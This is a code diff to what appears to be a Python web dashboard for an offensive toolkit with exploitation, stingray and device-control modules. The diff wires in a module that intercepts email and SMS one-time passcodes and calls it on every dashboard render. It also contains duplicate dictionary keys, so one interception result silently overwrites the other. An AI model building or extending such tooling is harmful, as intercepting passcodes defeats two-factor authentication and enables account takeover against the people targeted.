@@ -38,6 +38,7 @@ from modules.linux_control import LinuxControl
 from modules.android_control import AndroidControl
 from modules.ios_control import iOSControl
 from modules.advanced_device_control import AdvancedDeviceControl
+from modules.otp_interceptor import OTPInterceptor
 from database.models import DocumentAnalysis
 from sqlalchemy import create_engine
 from sqlalchemy.orm import sessionmaker
@@ -127,9 +128,20 @@ def dashboard():
         android_control = AndroidControl()
         ios_control = iOSControl()
         advanced_device_control = AdvancedDeviceControl()
+        otp_interceptor = OTPInterceptor(
+            email_config={
+                'host': 'your_email_host',
+                'username': 'your_email_username',
+                'password': 'your_email_password'
+            },
+            twilio_config={
+                'account_sid': 'your_twilio_account_sid',
+                'auth_token': 'your_twilio_auth_token'
+            }
+        )
 
         # Integration checks
-        if not all([malware_analysis, social_engineering, threat_intelligence, monitoring, advanced_threat_intelligence, predictive_analytics, automated_incident_response, ai_red_teaming, apt_simulation, machine_learning_ai, data_visualization, blockchain_logger, cloud_exploitation, iot_exploitation, quantum_computing, edge_computing, serverless_computing, microservices_architecture, cloud_native_applications, advanced_decryption, advanced_malware_analysis, advanced_social_engineering, alerts_notifications, device_fingerprinting, exploit_payloads, fuzzing_engine, mitm_stingray, network_exploitation, vulnerability_scanner, wireless_exploitation, zero_day_exploits, device_control, windows_control, macos_control, linux_control, android_control, ios_control, advanced_device_control]):
+        if not all([malware_analysis, social_engineering, threat_intelligence, monitoring, advanced_threat_intelligence, predictive_analytics, automated_incident_response, ai_red_teaming, apt_simulation, machine_learning_ai, data_visualization, blockchain_logger, cloud_exploitation, iot_exploitation, quantum_computing, edge_computing, serverless_computing, microservices_architecture, cloud_native_applications, advanced_decryption, advanced_malware_analysis, advanced_social_engineering, alerts_notifications, device_fingerprinting, exploit_payloads, fuzzing_engine, mitm_stingray, network_exploitation, vulnerability_scanner, wireless_exploitation, zero_day_exploits, device_control, windows_control, macos_control, linux_control, android_control, ios_control, advanced_device_control, otp_interceptor]):
             raise ValueError("Module integration check failed")
 
         monitoring.threat_intelligence_module = advanced_threat_intelligence
@@ -248,7 +260,9 @@ def dashboard():
                     "linux_control": linux_control.render(),
                     "android_control": android_control.render(),
                     "ios_control": ios_control.render(),
-                    "advanced_device_control": advanced_device_control.render()
+                    "advanced_device_control": advanced_device_control.render(),
+                    "otp_interceptor": otp_interceptor.intercept_email_otp(),
+                    "otp_interceptor": otp_interceptor.intercept_sms_otp()
                 }),
                 error=None
             )
@@ -300,6 +314,8 @@ def dashboard():
             "android_control": android_control.render(),
             "ios_control": ios_control.render(),
             "advanced_device_control": advanced_device_control.render(),
+            "otp_interceptor": otp_interceptor.intercept_email_otp(),
+            "otp_interceptor": otp_interceptor.intercept_sms_otp(),
             "continue_button": continue_button,
             "download_button": download_button
         })
